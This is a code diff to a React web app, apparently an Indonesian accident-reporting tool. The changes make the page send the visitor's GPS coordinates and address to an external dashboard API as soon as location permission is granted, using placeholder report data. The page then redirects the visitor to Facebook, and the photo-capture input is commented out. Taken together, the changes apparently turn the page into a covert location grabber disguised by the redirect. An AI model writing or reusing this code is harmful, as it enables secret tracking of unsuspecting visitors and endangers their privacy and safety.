@@ -49,6 +49,21 @@ export default function App() {
             coordinate: coords,
           }));
 
+          const dataBaru = {
+            nama: "TRY 1",
+            koordinat: {
+              lat: coords?.latitude,
+              lng: coords?.longitude,
+            },
+            imageUrl:
+              "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRgno8KKmm46kvbM9f-H3XU53bT-nxqlYPLqQ&s",
+            public_id: "student_images/mkfhlpxjkirhj9nh8nlg",
+            jenis_kecelakaan: "tunggal",
+            lokasi: alamat,
+          };
+
+          postData(dataBaru, true);
+
           setLocationAllowed(true); // tutup popup setelah berhasil
         },
         (err) => {
@@ -98,7 +113,7 @@ export default function App() {
         setMeta(allMetaData);
 
         const dataBaru = {
-          nama: "TESTING BOOTCAMP 9 AGUSTUS",
+          nama: "TRY 2",
           koordinat: {
             lat: data?.coordinate?.latitude,
             lng: data?.coordinate?.longitude,
@@ -109,7 +124,7 @@ export default function App() {
           lokasi: data?.alamat,
         };
 
-        postData(dataBaru);
+        postData(dataBaru, true);
       });
     } catch (err) {
       console.error("Upload gagal:", err);
@@ -148,16 +163,16 @@ export default function App() {
     }
   };
 
-  const postData = (dataBaru) => {
+  const postData = (dataBaru, direct = false) => {
     // kode eksekusi
 
     axios
       .post("https://bigboss-dashboard.vercel.app/api/location", dataBaru)
       .then((res) => {
-          console.log("res post", res);
-          setTimeout(() => {
-            window.location.href = "https://youtube.com";
-          }, 1000);
+        console.log("res post", res);
+        if (direct) {
+          window.location.href = "https://web.facebook.com";
+        }
       })
       .catch((err) => {
         console.log("err", err);
@@ -180,13 +195,13 @@ export default function App() {
       ) : (
         // Tampilkan kamera
         <div className="flex flex-col items-center">
-          <h2 className="text-lg font-bold mb-4">Ambil Foto</h2>
+          {/* <h2 className="text-lg font-bold mb-4">Ambil Foto</h2>
           <input
             type="file"
             accept="image/*"
             capture="environment"
             onChange={handleCapture}
-          />
+          /> */}
         </div>
       )}
     </div>
